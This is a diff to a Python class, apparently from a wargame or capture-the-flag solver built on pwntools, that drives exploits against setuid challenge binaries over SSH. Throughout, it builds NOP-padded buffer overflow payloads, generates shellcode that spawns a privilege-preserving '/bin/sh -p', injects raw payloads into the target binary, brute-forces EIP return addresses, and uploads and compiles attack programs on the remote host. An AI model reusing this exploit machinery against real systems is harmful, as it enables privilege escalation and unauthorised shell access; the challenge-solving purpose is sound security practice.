@@ -36,6 +36,15 @@ class ChallengeBinary(ChallengeSSH):
     def user_id_next(self):
         return self.USER_ID_FORMAT % (self._id + 1)
 
+    def get_padded_payload(self, payload, buffer_overflow_size, padding_size=0):
+        assert(buffer_overflow_size >= len(payload))
+        assert(padding_size <= buffer_overflow_size)
+
+        pad_left = asm(shellcraft.nop()) * padding_size
+        pad_right = asm(shellcraft.nop()) * (buffer_overflow_size - len(payload) - padding_size)
+
+        return pad_left + payload + pad_right
+
     def get_shellcode(self, change_uid_func=None):
         assert(change_uid_func is None or
                isinstance(change_uid_func, str) or
@@ -50,17 +59,34 @@ class ChallengeBinary(ChallengeSSH):
                 func = change_uid_func
             raw += func(self.user_id_next)
 
-        raw += shellcraft.sh()
+        raw += shellcraft.execve("/bin/sh", ["/bin/sh", "-p"])      # Do not use shellcraft.sh() directly as it does not work with setuid
 
         return asm(raw)
 
-    def exec_shellcode_to_get_pass(self, shellcode_payload, additionnal_params='',
-                                   clear_env=False, waiting_for_shell=0.0):
+    def _exec_shellcode(self, shellcode_payload=None, additionnal_params='',
+                        clear_env=False, catch_signal=None, **kwargs):
+        assert(shellcode_payload is not None)
+        assert(catch_signal is None or catch_signal in ('TERM', 'USR1', 'USR2')), f'Signal "{catch_signal}" is not supported'
+
         shellcode_payload = str(shellcode_payload).replace("'", '"')
 
-        output = f'{self.remote_work_dir}/output'
+        cmd_prefix = ''
+        if catch_signal is not None:
+            cmd_prefix = f'trap "" {catch_signal} ; '
 
-        stdin, _, _ = self.exec_cmd_raw(f'''{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({shellcode_payload})') {additionnal_params} > {output}''', clear_env=clear_env)
+        if clear_env:
+            cmd_prefix += 'env - '
+
+        cmd = f'''{cmd_prefix}{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({shellcode_payload})') {additionnal_params}'''
+
+        return self.exec_cmd_raw(cmd, **kwargs)
+
+    def exec_shellcode_to_get_pass(self, shellcode_payload, waiting_for_shell=0.0, **kwargs):
+
+        output = f'{self.remote_work_dir}/output'
+        additionnal_params = kwargs.get('additionnal_params', '') + f' > {output}'
+
+        stdin, _, _ = self._exec_shellcode(shellcode_payload=shellcode_payload, additionnal_params=additionnal_params, **kwargs)
 
         sleep(waiting_for_shell)
 
@@ -80,8 +106,8 @@ class ChallengeBinary(ChallengeSSH):
 
         return passwd
 
-    def find_eip_addresses(self, payload_prefix, estimated_eip_address, payload_suffix = b'', additionnal_params='',
-                           not_found_range=b'\x00\x10\x00\x00', found_count_max=1, clear_env=False):
+    def find_eip_addresses(self, payload_prefix, estimated_eip_address, payload_suffix = b'',
+                           not_found_range=b'\x00\x10\x00\x00', found_count_max=1, **kwargs):
 
         addr_int = int.from_bytes(estimated_eip_address, 'little')
         range_int = int.from_bytes(not_found_range, 'little')
@@ -99,7 +125,7 @@ class ChallengeBinary(ChallengeSSH):
                     payload = payload_prefix + eip_address + payload_suffix
                     payload = str(payload).replace("'", '"')
 
-                    stdin, stdout, _ = self.exec_cmd_raw(f'''{self.binary_to_exec} $(python3 -c 'import sys; sys.stdout.buffer.write({payload})') {additionnal_params}''', quiet=True, clear_env=clear_env)
+                    stdin, stdout, _ = self._exec_shellcode(shellcode_payload=payload, quiet=True, **kwargs)
                     while not stdout.channel.exit_status_ready():
                         sleep(.1)
                         if not stdin.channel.closed:
@@ -126,3 +152,27 @@ class ChallengeBinary(ChallengeSSH):
         self.log(f'    - {msg}' + ' ' * 100)
 
         return found
+
+    def deploy_attack_app(self, filename, content, compilation_needed=False):
+        assert(not filename.startswith(self.remote_work_dir))
+
+        output_filename = f'{self.remote_work_dir}/{filename}'
+        source_filename = f'{self.remote_work_dir}/source_{filename}.c' if compilation_needed else output_filename
+
+        with self.ssh_client.open_sftp() as ftp:
+            with ftp.file(source_filename, 'w', -1) as remote_file:
+                remote_file.write(content)
+                remote_file.flush()
+
+        if compilation_needed:
+            _, stdout, _ = self.exec_cmd_raw(f'TMPDIR="{self.remote_work_dir}" gcc -o "{output_filename}" "{source_filename}"')
+            if stdout.channel.recv_exit_status() != 0:
+                raise RuntimeError('Compilation failed')
+        else:
+            self.exec_cmd(f'[ -x "{output_filename}" ] || chmod +x {output_filename}')
+
+        _, stdout, _ = self.exec_cmd_raw(f'[ -x "{output_filename}" ]')
+        if stdout.channel.recv_exit_status() != 0:
+            raise RuntimeError(f'{output_filename} was not created correctly')
+
+        return output_filename
